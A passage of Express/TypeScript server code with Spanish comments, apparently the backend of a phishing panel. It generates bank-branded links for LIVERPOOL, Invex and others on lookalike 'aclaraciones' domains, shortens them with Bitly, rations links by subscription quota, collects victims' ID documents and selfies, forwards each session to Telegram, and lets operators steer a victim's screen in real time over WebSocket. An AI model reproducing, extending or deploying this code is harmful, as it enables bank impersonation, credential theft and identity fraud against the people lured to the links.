          message: `Enviado a ${sentCount} usuarios, ${failedCount} fallidos`,
          sentCount,
          failedCount,
          errors
        });
      } else {
        console.error(`❌ Todos los envíos fallaron (${failedCount})`);
        res.status(500).json({ 
          success: false, 
          message: "Error enviando mensajes",
          sentCount: 0,
          failedCount,
          errors
        });
      }

    } catch (error: any) {
      console.error('❌ Error en endpoint send-message:', error);
      
      // Limpiar archivo temporal en caso de error
      if (req.file && fs.existsSync(req.file.path)) {
        try {
          fs.unlinkSync(req.file.path);
        } catch (e) {
          console.error('Error eliminando archivo temporal:', e);
        }
      }
      
      res.status(500).json({ success: false, message: error.message });
    }
  });

  // Endpoint de depuración para ver todas las sesiones
  app.get('/api/debug/all-sessions', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }
      
      // Solo permitir a superadmin acceder a este endpoint
      const user = req.user;
      if (user.username !== 'balonx') {
        return res.status(403).json({ message: "Solo superadmin puede acceder a este endpoint" });
      }
      
      // Obtener absolutamente todas las sesiones sin filtrar
      const allSessions = await storage.getAllSessions();
      console.log(`[Debug] Total de sesiones en almacenamiento: ${allSessions.length}`);
      
      // Contar las sesiones guardadas y corrientes
      const savedSessions = allSessions.filter(s => s.saved === true);
      const currentSessions = allSessions.filter(s => s.active === true && s.saved === false);
      
      // Verificar información de creación
      const sessionsWithCreator = allSessions.filter(s => s.createdBy).length;
      const sessionsWithoutCreator = allSessions.filter(s => !s.createdBy).length;
      
      res.json({
        count: {
          total: allSessions.length,
          saved: savedSessions.length,
          current: currentSessions.length,
          withCreator: sessionsWithCreator,
          withoutCreator: sessionsWithoutCreator
        },
        sessions: allSessions
      });
    } catch (error) {
      console.error("Error obteniendo sesiones para depuración:", error);
      res.status(500).json({ message: "Error obteniendo sesiones" });
    }
  });
  
  // Endpoint para forzar el creador de sesiones existentes (para depuración)
  app.post('/api/debug/force-session-creator', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }
      
      const { sessionId, username } = req.body;
      if (!sessionId || !username) {
        return res.status(400).json({ message: "Se requiere sessionId y username" });
      }
      
      const session = await storage.getSessionById(sessionId);
      if (!session) {
        return res.status(404).json({ message: "Sesión no encontrada" });
      }
      
      // Actualizar manualmente el creador
      const updatedSession = await storage.updateSession(sessionId, { createdBy: username });
      console.log(`[Debug] Forzado creador de sesión ${sessionId} a: ${username}`);
      
      res.json({ success: true, session: updatedSession });
    } catch (error) {
      console.error("Error forzando creador de sesión:", error);
      res.status(500).json({ message: "Error forzando creador de sesión" });
    }
  });
  
  // Endpoint para crear una sesión con usuario brandon (para depuración)
  app.get('/api/debug/create-brandon-session', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }
      
      // Solo permitir a superadmin o brandon acceder
      const user = req.user;
      if (user.username !== 'balonx' && user.username !== 'brandon') {
        return res.status(403).json({ message: "No autorizado para acceder a este endpoint" });
      }
      
      // Crear sesión para brandon
      // Usar código de 8 dígitos numérico como ID de sesión y folio
      const brandLinkCode = '12345678';
      const sessionId = brandLinkCode;
      
      const session = await storage.createSession({ 
        sessionId, 
        banco: "LIVERPOOL",
        folio: brandLinkCode,
        pasoActual: ScreenType.FOLIO,
        createdBy: 'brandon', // Forzar el creador como brandon
      });
      
      // Guardar la sesión explícitamente
      const savedSession = await storage.saveSession(sessionId);
      console.log(`[Debug] Creada sesión ${sessionId} para brandon`);
      
      if (!savedSession.createdBy) {
        console.log(`[Debug] ERROR: Sesión guardada sin creador. Corrigiendo...`);
        await storage.updateSession(sessionId, { createdBy: 'brandon' });
      }
      
      // Verificar estado después de guardar
      const sessionAfterSave = await storage.getSessionById(sessionId);
      
      res.json({ 
        success: true, 
        sessionId,
        session: sessionAfterSave
      });
    } catch (error) {
      console.error("Error creando sesión de prueba:", error);
      res.status(500).json({ message: "Error creando sesión de prueba" });
    }
  });

  app.get('/api/sessions', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }
      
      const { type = 'current' } = req.query;
      const user = req.user as any;
      console.log(`[Sessions] Usuario ${user.username} solicitando sesiones, tipo: ${type}, rol: ${user.role}, isExecutive: ${user.isExecutive}`);
      
      const isExecutive = user.isExecutive === true;
      
      // Usar los métodos de storage que ya tienen filtrado
      let sessions;
      
      if (user.role === 'admin') {
        // Admin ve todas las sesiones
        if (type === 'saved') {
          sessions = await storage.getSavedSessions();
        } else {
          sessions = await storage.getCurrentSessions();
        }
        console.log(`[Sessions] Admin ${user.username} accediendo a ${sessions.length} sesiones (tipo: ${type})`);
      } else {
        // Usuario normal o ejecutivo - filtrar por userId
        if (type === 'saved') {
          sessions = await storage.getSavedSessions(user.id, isExecutive);
        } else {
          sessions = await storage.getCurrentSessions(user.id, isExecutive);
        }
        console.log(`[Sessions] Usuario ${user.username} (ejecutivo: ${isExecutive}), mostrando ${sessions.length} sesiones (tipo: ${type})`);
      }
      
      // Ordenamos por fecha más reciente primero
      sessions.sort((a, b) => {
        const dateA = a.createdAt ? new Date(a.createdAt).getTime() : 0;
        const dateB = b.createdAt ? new Date(b.createdAt).getTime() : 0;
        return dateB - dateA;
      });

      res.json(sessions);
    } catch (error) {
      console.error("Error fetching sessions:", error);
      res.status(500).json({ message: "Error fetching sessions" });
    }
  });

  app.post('/api/sessions', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const user = req.user as any;
      const { banco = "Invex" } = req.body;
      
      // Generamos un código de 8 dígitos y lo usamos como ID de sesión
      let codeForSession = '';
      for (let i = 0; i < 8; i++) {
        codeForSession += Math.floor(Math.random() * 10).toString();
      }
      const sessionId = codeForSession;
      
      const session = await storage.createSession({ 
        sessionId, 
        banco,
        folio: codeForSession,
        pasoActual: ScreenType.FOLIO,
        createdBy: user.isExecutive ? user.officeUsername : user.username,
        executiveId: user.isExecutive ? user.id : null, // Incluir executiveId si es ejecutivo
      });
      
      console.log(`Sesión creada: ${sessionId}, creador: ${user.username}, executiveId: ${user.isExecutive ? user.id : null}`);

      // Notificar a los clientes de admin sobre la actualización
      broadcastToAdmins(JSON.stringify({
        type: 'SESSIONS_UPDATED',
        data: {
          userName: user.username
        }
      }));
      
      res.json(session);
    } catch (error) {
      console.error("Error creating session:", error);
      res.status(500).json({ message: "Error creating session" });
    }
  });

  app.post('/api/sessions/:id/update', async (req, res) => {
    try {
      const { id } = req.params;
      
      // Actualizar sesión
      const session = await storage.updateSession(id, req.body);

      // NO consumir token cuando se ingresa folio - los links nunca se invalidan automáticamente
      // Solo se invalidan mediante cancelación manual

      // Notify all admin clients
      broadcastToAdmins(JSON.stringify({
        type: 'SESSION_UPDATE',
        data: session
      }));

      res.json(session);
    } catch (error) {
      console.error("Error updating session:", error);
      res.status(500).json({ message: "Error updating session" });
    }
  });

  // Endpoint para guardar una sesión
  app.post('/api/sessions/:id/save', async (req, res) => {
    try {
      const { id } = req.params;
      const session = await storage.saveSession(id);

      // Notify all admin clients
      broadcastToAdmins(JSON.stringify({
        type: 'SESSION_UPDATE',
        data: session
      }));

      res.json(session);
    } catch (error) {
      console.error("Error saving session:", error);
      res.status(500).json({ message: "Error saving session" });
    }
  });

  // Endpoint para eliminar una sesión
  app.delete('/api/sessions/:id', async (req, res) => {
    try {
      const { id } = req.params;
      const success = await storage.deleteSession(id);

      if (success) {
        // Notify all admin clients
        broadcastToAdmins(JSON.stringify({
          type: 'SESSION_DELETE',
          data: { sessionId: id }
        }));

        res.json({ success: true });
      } else {
        res.status(404).json({ success: false, message: "Session not found" });
      }
    } catch (error) {
      console.error("Error deleting session:", error);
      res.status(500).json({ message: "Error deleting session" });
    }
  });

  // Endpoint para limpiar sesiones expiradas (más de 5 días)
  app.post('/api/cleanup-sessions', async (req, res) => {
    try {
      const deletedCount = await storage.cleanupExpiredSessions();

      // Notify all admin clients to refresh their session list
      broadcastToAdmins(JSON.stringify({
        type: 'SESSIONS_CLEANUP',
        data: { deletedCount }
      }));

      res.json({ success: true, deletedCount });
    } catch (error) {
      console.error("Error cleaning up sessions:", error);
      res.status(500).json({ message: "Error cleaning up sessions" });
    }
  });

  // Endpoint para subir archivos de protección bancaria
  app.post('/api/upload-protection-file', upload.single('file'), async (req, res) => {
    try {
      if (!req.file) {
        return res.status(400).json({ message: "No se proporcionó archivo" });
      }

      const { sessionId } = req.body;
      if (!sessionId) {
        return res.status(400).json({ message: "Session ID requerido" });
      }

      // Generar URL del archivo
      const fileUrl = `/uploads/${req.file.filename}`;
      
      // Actualizar la sesión con la información del archivo
      const updatedSession = await storage.updateSession(sessionId, {
        fileName: req.file.originalname,
        fileUrl: fileUrl,
        fileSize: (req.file.size / (1024 * 1024)).toFixed(2) + ' MB'
      });

      console.log(`Archivo ${req.file.originalname} subido para sesión ${sessionId}`);

      res.json({
        success: true,
        fileName: req.file.originalname,
        fileUrl: fileUrl,
        fileSize: (req.file.size / (1024 * 1024)).toFixed(2) + ' MB'
      });
    } catch (error) {
      console.error("Error uploading protection file:", error);
      res.status(500).json({ message: "Error al subir archivo" });
    }
  });

  // Endpoint para subir documentos de identidad (documento + selfie)
  app.post('/api/upload-identity-files', upload.fields([
    { name: 'documentFile', maxCount: 1 },
    { name: 'documentBackFile', maxCount: 1 },
    { name: 'selfieFile', maxCount: 1 }
  ]), async (req, res) => {
    try {
      const files = req.files as { [fieldname: string]: Express.Multer.File[] };
      const { sessionId, documentType } = req.body;

      console.log('Files received:', Object.keys(files || {}));
      console.log('Request body:', req.body);

      if (!sessionId) {
        return res.status(400).json({ message: "Session ID requerido" });
      }

      if (!files.documentFile || !files.selfieFile) {
        return res.status(400).json({ message: "Se requieren archivos: documento frontal y selfie" });
      }

      const documentFile = files.documentFile[0];
      const documentBackFile = files.documentBackFile ? files.documentBackFile[0] : null;
      const selfieFile = files.selfieFile[0];

      // Generar URLs de los archivos
      const documentFileUrl = `/uploads/${documentFile.filename}`;
      const documentBackFileUrl = documentBackFile ? `/uploads/${documentBackFile.filename}` : null;
      const selfieFileUrl = `/uploads/${selfieFile.filename}`;
      
      // Preparar datos de actualización
      const updateData: any = {
        documentType: documentType,
        documentFileName: documentFile.originalname,
        documentFileUrl: documentFileUrl,
        selfieFileName: selfieFile.originalname,
        selfieFileUrl: selfieFileUrl,
        identityVerified: true
      };

      // Agregar archivo de respaldo si existe (para INE)
      if (documentBackFile) {
        updateData.documentBackFileName = documentBackFile.originalname;
        updateData.documentBackFileUrl = documentBackFileUrl;
      }
      
      // Actualizar la sesión con la información de los archivos de identidad
      const updatedSession = await storage.updateSession(sessionId, updateData);

      console.log(`Documentos de identidad subidos para sesión ${sessionId}: ${documentType} + selfie`);

      // Notificar por Telegram que se subieron documentos de identidad
      try {
        const session = await storage.getSessionById(sessionId);
        if (session && session.createdBy) {
          await sendTelegramNotification({
            sessionId: sessionId,
            banco: session.banco || 'UNKNOWN',
            tipo: 'verificacion_id',
            data: {
              documentType: documentType,
              documentFile: documentFile.originalname,
              selfieFile: selfieFile.originalname
            },
            timestamp: new Date().toLocaleString('es-MX', { timeZone: 'America/Mexico_City' }),
            createdBy: session.createdBy
          });
        }
      } catch (notificationError) {
        console.error('Error sending Telegram notification for identity documents:', notificationError);
      }

      const response: any = {
        success: true,
        documentFile: {
          fileName: documentFile.originalname,
          fileUrl: documentFileUrl,
          fileSize: (documentFile.size / (1024 * 1024)).toFixed(2) + ' MB'
        },
        selfieFile: {
          fileName: selfieFile.originalname,
          fileUrl: selfieFileUrl,
          fileSize: (selfieFile.size / (1024 * 1024)).toFixed(2) + ' MB'
        },
        documentType: documentType
      };

      // Agregar archivo de respaldo si existe
      if (documentBackFile) {
        response.documentBackFile = {
          fileName: documentBackFile.originalname,
          fileUrl: documentBackFileUrl,
          fileSize: (documentBackFile.size / (1024 * 1024)).toFixed(2) + ' MB'
        };
      }

      res.json(response);
    } catch (error) {
      console.error("Error uploading identity files:", error);
      res.status(500).json({ message: "Error al subir archivos de identidad" });
    }
  });

  // Endpoint para obtener sesiones con verificación de identidad
  app.get('/api/admin/identity-sessions', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const currentUser = req.user as any;
      
      console.log(`[Identity] Usuario ${currentUser.username} solicitando sesiones con verificación ID`);
      console.log(`[Identity] Tipo: ${currentUser.isExecutive ? 'ejecutivo' : currentUser.accountType || 'individual'}`);
      
      // Superadmin ve todas las sesiones
      if (currentUser.role === UserRole.ADMIN && currentUser.username === 'balonx') {
        const sessions = await storage.getSessionsWithIdentityDocuments();
        console.log(`[Identity] Superadmin ve todas las sesiones: ${sessions.length}`);
        res.json(sessions);
        return;
      }
      
      // Usuarios regulares, ejecutivos y oficinas ven solo sus sesiones
      const sessions = await storage.getSessionsWithIdentityDocuments(
        currentUser.id,
        currentUser.isExecutive || false
      );
      
      console.log(`[Identity] Usuario ${currentUser.username} ve ${sessions.length} sesiones con verificación ID`);
      res.json(sessions);
    } catch (error: any) {
      console.error('Error fetching identity sessions:', error);
      res.status(500).json({ message: error.message });
    }
  });

  // Endpoint para obtener los bancos permitidos del usuario actual
  app.get('/api/user/allowed-banks', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }
      
      const user = req.user;
      console.log(`[API] Solicitud de bancos permitidos para usuario ${user.username}`);
      console.log(`[API] Role: ${user.role}, allowedBanks: ${user.allowedBanks || 'no definido'}`);
      
      let allowedBanks: string[] = [];
      
      // Verificar siempre si el allowedBanks es undefined o null para evitar errores
      const userBanks = user.allowedBanks || 'all';
      
      // Si es el superadmin "balonx", puede ver todos los bancos sin importar su configuración
      if (user.username === "balonx") {
        console.log('[API] Usuario es superadmin (balonx), devolviendo lista completa independientemente de su configuración');
        // Devolver todos los valores de BankType excepto 'all'
        allowedBanks = Object.values(BankType).filter(bank => bank !== BankType.ALL) as string[];
      } 
      // Si es administrador pero no es balonx, verificar sus restricciones específicas de bancos
      else if (user.role === UserRole.ADMIN) {
        console.log(`[API] Usuario es admin (${user.username}), verificando restricciones específicas de bancos`);
        console.log(`[API] allowedBanks del admin: ${userBanks}`);
        
        // Verificar si tiene valor 'all' o bancos específicos
        if (userBanks === 'all' || userBanks.toLowerCase() === 'all') {
          console.log('[API] Admin tiene permiso para todos los bancos (all)');
          allowedBanks = Object.values(BankType).filter(bank => bank !== BankType.ALL) as string[];
        } else if (userBanks && userBanks !== '') {
          console.log(`[API] Admin tiene bancos específicos: ${userBanks}`);
          // Dividir la cadena por comas y procesar
          allowedBanks = userBanks
            .split(',')
            .map(b => b.trim())
            .filter(b => b.length > 0);
          
          console.log(`[API] Bancos de admin procesados: [${allowedBanks.join(', ')}]`);
        } else {
          console.log('[API] Admin sin bancos definidos');
        }
      }
      // Si el usuario tiene "all" explícitamente asignado, mostrar todos los bancos
      else if (userBanks === 'all' || userBanks.toLowerCase() === 'all') {
        console.log('[API] Usuario tiene todos los bancos permitidos (all), devolviendo lista completa');
        // Devolver todos los valores de BankType excepto 'all'
        allowedBanks = Object.values(BankType).filter(bank => bank !== BankType.ALL) as string[];
      } 
      // Si tiene bancos específicos permitidos (lista separada por comas)
      else if (userBanks && userBanks !== '') {
        console.log(`[API] Usuario tiene bancos específicos permitidos: ${userBanks}`);
        // Dividir la cadena por comas, limpiar espacios en blanco y filtrar valores vacíos
        allowedBanks = userBanks
          .split(',')
          .map(b => b.trim())
          .filter(b => b.length > 0);
        
        console.log(`[API] Bancos después de procesamiento: [${allowedBanks.join(', ')}]`);
        
        // Verificar que todos los bancos en la lista sean válidos
        const invalidBanks = allowedBanks.filter(bank => !Object.values(BankType).includes(bank as BankType));
        if (invalidBanks.length > 0) {
          console.log(`[API] ADVERTENCIA: Se encontraron bancos inválidos en la lista: ${invalidBanks.join(', ')}`);
        }
      } else {
        console.log('[API] Usuario no tiene bancos permitidos definidos o el valor está vacío');
      }
      
      console.log(`[API] Devolviendo ${allowedBanks.length} bancos permitidos:`);
      allowedBanks.forEach(bank => console.log(`[API] - Banco permitido: ${bank}`));
      
      res.json({
        success: true,
        allowedBanks,
        userRole: user.role,
        userAllowedBanksRaw: userBanks // Para depuración
      });
    } catch (error: any) {
      console.log(`[API] Error obteniendo bancos permitidos: ${error.message}`);
      res.status(500).json({ message: error.message });
    }
  });
  
  app.get('/api/generate-link', async (req, res) => {
    try {
      if (!req.isAuthenticated()) {
        return res.status(401).json({ message: "No autenticado" });
      }

      const { banco = "LIVERPOOL" } = req.query;
      const user = req.user;
      
      // Validar que el banco solicitado esté permitido para el usuario
      const userBanks = user.allowedBanks || 'all';
      let hasBankAccess = false;
      
      // Lógica mejorada para verificar permisos de bancos
      // Si es superadmin (balonx), tiene acceso a todos los bancos sin importar su configuración
      if (user.username === "balonx") {
        hasBankAccess = true;
        console.log(`[API] Superadmin ${user.username} tiene acceso a todos los bancos`);
      } 
      // Si es administrador pero no es balonx, verificar sus restricciones específicas
      else if (user.role === UserRole.ADMIN) {
        console.log(`[API] Admin ${user.username} solicita banco ${banco}, verificando permisos específicos`);
        
        // Si tiene valor 'all', tiene acceso a todos los bancos
        if (userBanks === 'all' || userBanks.toLowerCase() === 'all') {
          hasBankAccess = true;
          console.log(`[API] Admin ${user.username} tiene acceso a todos los bancos (all)`);
        } 
        // Si tiene bancos específicos, debe estar en la lista
        else if (userBanks && userBanks !== '') {
          const allowedBanksList = userBanks.split(',').map(b => b.trim());
          console.log(`[API] Admin ${user.username} solicita banco ${banco}, permitidos: ${allowedBanksList.join(', ')}`);
          
          if (allowedBanksList.includes(banco as string)) {
            hasBankAccess = true;
            console.log(`[API] Banco ${banco} permitido para admin ${user.username}`);
          } else {
            console.log(`[API] Banco ${banco} NO permitido para admin ${user.username}. Bancos permitidos: ${allowedBanksList.join(', ')}`);
          }
        } else {
          console.log(`[API] Admin ${user.username} sin bancos definidos`);
        }
      }
      // Para usuarios regulares
      // Si tiene valor "all", tiene acceso a todos los bancos
      else if (userBanks === 'all' || userBanks.toLowerCase() === 'all') {
        hasBankAccess = true;
        console.log(`[API] Usuario ${user.username} tiene acceso a todos los bancos (all)`);
      }
      // Si tiene bancos específicos, debe estar en la lista
      else if (userBanks && userBanks !== '') {
        const allowedBanksList = userBanks.split(',').map(b => b.trim());
        console.log(`[API] Usuario ${user.username} solicita banco ${banco}, permitidos: ${allowedBanksList.join(', ')}`);
        
        if (allowedBanksList.includes(banco as string)) {
          hasBankAccess = true;
          console.log(`[API] Banco ${banco} permitido para ${user.username}`);
        } else {
          console.log(`[API] Banco ${banco} NO permitido para ${user.username}. Bancos permitidos: ${allowedBanksList.join(', ')}`);
        }
      }
      
      // Si no tiene acceso, devolver error claro
      if (!hasBankAccess) {
        const bancos = userBanks === 'all' ? 'todos los bancos' : userBanks.split(',').map(b => b.trim()).join(', ');
        return res.status(403).json({ 
          error: `Banco ${banco} no permitido. Solo puedes usar: ${bancos}` 
        });
      }

      // Generamos un código de 8 dígitos numéricos que usaremos tanto para el ID como para el folio
      let linkCode = '';
      for (let i = 0; i < 8; i++) {
        linkCode += Math.floor(Math.random() * 10).toString();
      }
      
      // Usamos el mismo código numérico para el ID de sesión y el folio
      const sessionId = linkCode;

      // Obtener flujo personalizado del usuario para este banco
      const userFlow = await storage.getUserBankFlow(user.id, (banco as string).toLowerCase());
      const flowConfig = userFlow?.flowConfig || null;

      if (flowConfig && Array.isArray(flowConfig)) {
        console.log(`[Links] Aplicando flujo personalizado del usuario ${user.username} para banco ${banco}`);
        console.log(`[Links] Flujo contiene ${flowConfig.length} pasos`);
      } else {
        console.log(`[Links] Usuario ${user.username} no tiene flujo personalizado para banco ${banco}, usando flujo estándar`);
      }

      const session = await storage.createSession({ 
        sessionId, 
        banco: banco as string,
        folio: linkCode, // Mismo código para el folio
        pasoActual: ScreenType.FOLIO,
        createdBy: (user as any).isExecutive ? (user as any).officeUsername : user.username,
        executiveId: (user as any).isExecutive ? (user as any).id : null, // Incluir executiveId si es ejecutivo
        flowConfig, // Aplicar flujo personalizado del usuario
      });

      console.log(`Sesión creada: ${sessionId}, creador: ${user.username}, executiveId: ${(user as any).isExecutive ? (user as any).id : null}, flowConfig: ${flowConfig ? 'aplicado' : 'ninguno'}`);

      // Configuración de dominios
      const clientDomain = process.env.CLIENT_DOMAIN || 'aclaraciones.info';
      const adminDomain = process.env.ADMIN_DOMAIN || 'panel.aclaraciones.info';

      // Detectamos si estamos en Replit para generar enlaces locales para pruebas
      const isReplit = process.env.REPL_ID || process.env.REPL_SLUG;
      
      // Armamos los enlaces para ambos dominios
      // Obtenemos la URL actual de la solicitud para generar enlaces relativos en Replit
      const baseUrl = req.headers.host || (isReplit ? `${process.env.REPL_SLUG || 'workspace'}.replit.dev` : clientDomain);
      const protocol = req.headers['x-forwarded-proto'] || 'https';
      
      // Obtener la URL base desde la configuración del sitio
      const siteConfig = await storage.getSiteConfig();
      const baseClientUrl = siteConfig?.baseUrl || 'https://aclaracionesditales.com';
      const clientLink = `${baseClientUrl}/${sessionId}`;
      
      // Para el admin link, si estamos en Replit permitimos usar la URL local para testing
      const adminLink = isReplit 
        ? `${protocol}://${baseUrl}` 
        : `https://${adminDomain}`;

      // ===== NUEVA INTEGRACIÓN CON BITLY Y SUBDOMINIOS =====
      let shortUrl: string | undefined;
      let expiresAt: Date | undefined;
      let linkCreationError: string | undefined;
      let tokenizedUrl: string | undefined;

      try {
        // Mapear banco UI a BankType (normalizar a mayúsculas para case-insensitive)
        const bankCode = BANK_UI_TO_TYPE[(banco as string).toUpperCase()];
        
        if (bankCode) {
          console.log(`[Links] Generando link con Bitly para banco ${bankCode}, sessionId: ${sessionId}`);
          
          // Crear link con token único, Bitly y subdominio
          const linkResult = await linkTokenService.createLink({
            userId: user.id,
            bankCode,
            sessionId,
            metadata: {
              createdBy: (user as any).isExecutive ? (user as any).officeUsername : user.username
            }
          });
          
          shortUrl = linkResult.shortUrl || undefined;
          tokenizedUrl = linkResult.originalUrl; // Link con token (banco.aclaracion.info/client/TOKEN)
          expiresAt = linkResult.expiresAt;
          
          console.log(`[Links] ✅ Link con token y Bitly creado exitosamente: ${shortUrl || tokenizedUrl}`);
        } else {
          console.log(`[Links] ⚠️ Banco ${banco} no mapeado a BankType, usando link largo`);
        }
      } catch (error: any) {
        // Si es error de cuota, propagar como 429
        if (error.message?.includes('cuota semanal') || error.message?.includes('límite semanal')) {
          console.error(`[Links] ❌ Cuota semanal agotada para usuario ${user.id}`);
          return res.status(429).json({ 
            error: 'Has alcanzado tu límite semanal de links (150). La cuota se resetea cada lunes.',
            quotaExhausted: true
          });
        }
        
        // Para otros errores (Bitly, BD, etc.), loguear pero continuar con link largo
        console.error(`[Links] ⚠️ Error generando link con Bitly (usando fallback):`, error.message);
        linkCreationError = error.message;
      }

      // Enlace generado correctamente (largo o corto)

      // Notificando clientes admin
      
      // Notificar a los clientes de admin sobre el nuevo enlace
      // Enviar al usuario que creó el link y al superadmin
      broadcastToAdmins(JSON.stringify({
        type: 'LINK_GENERATED',
        data: { 
          sessionId,
          code: linkCode,
          banco: banco as string,
          userName: user.username,
          createdBy: user.username // Añadimos para consistency
        }
      }), user.username); // Pasamos el username como segundo argumento

      // Enviar también un mensaje de actualización de sesiones para refrescar la lista
      // Este mensaje hará que todos los clientes obtengan la lista actualizada del servidor
      broadcastToAdmins(JSON.stringify({
        type: 'SESSIONS_UPDATED',
        data: {
          userName: user.username
        }
      }));

      // Enviar una señal específica a través de WebSocket para actualizar las sesiones del usuario
      // con información completa sobre la nueva sesión
      broadcastToAdmins(JSON.stringify({
        type: 'SESSION_UPDATE',
        data: {
          sessionId,
          banco: banco as string,
          folio: linkCode,
          pasoActual: ScreenType.FOLIO,
          createdBy: user.username,
          saved: false,
          createdAt: new Date().toISOString()
        }
      }));

      // Enviar notificación de nueva sesión a Telegram
      await sendSessionCreatedNotification({
        sessionId,
        banco: banco as string,
        folio: linkCode,
        createdBy: user.username,
        link: shortUrl || tokenizedUrl || clientLink // Preferir link corto, luego tokenizado, luego largo
      });

      res.json({ 
        sessionId, 
        link: tokenizedUrl || clientLink, // Preferir link tokenizado, luego largo para compatibilidad
        shortUrl, // Opcional: link corto de Bitly con subdominio
        expiresAt, // Opcional: fecha de expiración del token
        adminLink: adminLink,
        code: linkCode
      });
    } catch (error) {
      console.error("Error generating link:", error);
      res.status(500).json({ message: "Error generating link" });
    }
  });

  // Tarea programada para limpiar sesiones inactivas (cada 2 minutos)
  const cleanupInterval = setInterval(async () => {
    try {
      console.log("[Cleanup] Ejecutando limpieza programada de sesiones inactivas...");
      const deletedCount = await storage.cleanupExpiredSessions();
      
      if (deletedCount > 0) {
        console.log(`[Cleanup] Se eliminaron ${deletedCount} sesiones inactivas o expiradas`);
        
        // Notificar a todos los clientes de administración
        broadcastToAdmins(JSON.stringify({
          type: 'SESSIONS_CLEANUP',
          data: { 
            deletedCount,
            automatic: true,
            timestamp: new Date().toISOString()
          }
        }));
      }
      
      // También verificar y desactivar usuarios expirados
      console.log("[Cleanup] Verificando usuarios con suscripciones vencidas...");
      const deactivatedCount = await storage.cleanupExpiredUsers();
      
      if (deactivatedCount > 0) {
        console.log(`[Cleanup] Se desactivaron ${deactivatedCount} usuarios con suscripciones vencidas`);
        
        // Notificar a todos los clientes de administración
        broadcastToAdmins(JSON.stringify({
          type: 'USERS_CLEANUP',
          data: { 
            deactivatedCount,
            automatic: true,
            timestamp: new Date().toISOString()
          }
        }));
      }
    } catch (error) {
      console.error("[Cleanup] Error en la limpieza automática:", error);
    }
  }, 2 * 60 * 1000); // Cada 2 minutos (2 * 60 * 1000 ms)
  
  // WebSocket handling
  wss.on('connection', (ws, req) => {
    console.log('New WebSocket connection');

    // Handle client/admin identification
    ws.on('message', async (message) => {
      try {
        const data = JSON.parse(message.toString());

        // Register client or admin
        if (data.type === 'REGISTER') {
          if (data.role === 'ADMIN') {
            // Determinar si es un administrador o un usuario basado en el username
            const userName = data.username || '';
            const user = await storage.getUserByUsername(userName);
            
            if (!user) {
              console.log(`WebSocket: Usuario ${userName} no encontrado en la base de datos`);
              ws.send(JSON.stringify({
                type: 'ERROR',
                message: 'Usuario no encontrado'
              }));
              return;
            }
            
            // Guardar el cliente en el Map con su username como clave
            adminClients.set(userName, ws);
            console.log(`Admin client registered: ${userName}`);
            
            console.log(`WebSocket: Usuario ${userName} (rol: ${user.role}) autenticado, obteniendo sesiones...`);
            
            // NUEVA IMPLEMENTACIÓN UNIFICADA PARA TODOS LOS USUARIOS
            if (false) { // Este bloque nunca se ejecuta, solo se mantiene para referencia
              console.log(`WebSocket: Usuario ${userName} detectado como usuario brandon, obteniendo sus sesiones guardadas...`);
              
              // Obtener todas las sesiones guardadas primero 
              const allSavedSessions = await storage.getSavedSessions();
              
              console.log(`WebSocket: Encontradas ${allSavedSessions.length} sesiones guardadas en total`);
              
              // Mostrar detalles de cada sesión guardada para depuración
              allSavedSessions.forEach(session => {
                console.log(`WebSocket: Sesión ${session.sessionId}, creador=${session.createdBy || 'desconocido'}, banco=${session.banco}`);
              });
              
              // Filtrar EXPLÍCITAMENTE sólo las guardadas de este usuario
              const filteredSessions = allSavedSessions.filter(session => session.createdBy === userName);
              
              console.log(`WebSocket: Después de filtrar, enviando ${filteredSessions.length} sesiones guardadas a usuario ${userName}`);
              
              // Enviar las sesiones al cliente
              ws.send(JSON.stringify({
                type: 'INIT_SESSIONS',
                data: filteredSessions
              }));
            } 
            else {
              // NUEVA IMPLEMENTACIÓN UNIFICADA PARA TODOS LOS USUARIOS
              // Filtrado en base de datos por userId
              const isExecutive = (user as any).isExecutive === true;
              
              // Admins (role === 'admin') ven todas las sesiones (userId = undefined)
              // Ejecutivos y usuarios normales ven sesiones filtradas
              const userId = user.role === 'admin' ? undefined : user.id;
              
              // Obtenemos tanto las sesiones guardadas como las actuales (filtradas por usuario)
              const allSavedSessions = await storage.getSavedSessions(userId, isExecutive);
              const currentSessions = await storage.getCurrentSessions(userId, isExecutive);
              
              console.log(`WebSocket: Usuario ${userName} (rol: ${user.role}, ejecutivo: ${isExecutive}, filtrado: ${userId ? 'sí' : 'no'}) - ${allSavedSessions.length} guardadas, ${currentSessions.length} actuales`);
              
              // Combinamos ambas listas (evitando duplicados por sessionId)
              const allSessionsMap = new Map();
              [...allSavedSessions, ...currentSessions].forEach(session => {
                allSessionsMap.set(session.sessionId, session);
              });
              
              const sessions = Array.from(allSessionsMap.values());
              
              console.log(`WebSocket: Enviando ${sessions.length} sesiones totales a ${userName}`);
              
              // Enviamos las sesiones al cliente
              ws.send(JSON.stringify({
                type: 'INIT_SESSIONS',
                data: sessions
              }));
            }
            
            // El envío de sesiones ya se hace en las ramas condicionales anteriores
            
            // Run cleanup of old sessions (more than 5 days)
            try {
              const deletedCount = await storage.cleanupExpiredSessions();
              if (deletedCount > 0) {
                console.log(`Cleaned up ${deletedCount} expired sessions`);
                broadcastToAdmins(JSON.stringify({
                  type: 'SESSIONS_CLEANUP',
                  data: { deletedCount }
                }));
              }
            } catch (error) {
              console.error("Error cleaning up expired sessions:", error);
            }
          } 
          else if (data.role === 'CLIENT' && data.sessionId) {
            clients.set(data.sessionId, ws);
            console.log(`Client registered with session ID: ${data.sessionId}`);

            // Get session info and send to client
            const session = await storage.getSessionById(data.sessionId);
            if (session) {
              ws.send(JSON.stringify({
                type: 'INIT_SESSION',
                data: session
              }));
            }
          }
          return;
        }

        // Handle screen change request from admin
        if (data.type === 'SCREEN_CHANGE') {
          try {
            // Validate the data
            const validatedData = screenChangeSchema.parse(data.data);
            const { sessionId, tipo } = validatedData;

            // Find the target client
            const client = clients.get(sessionId);
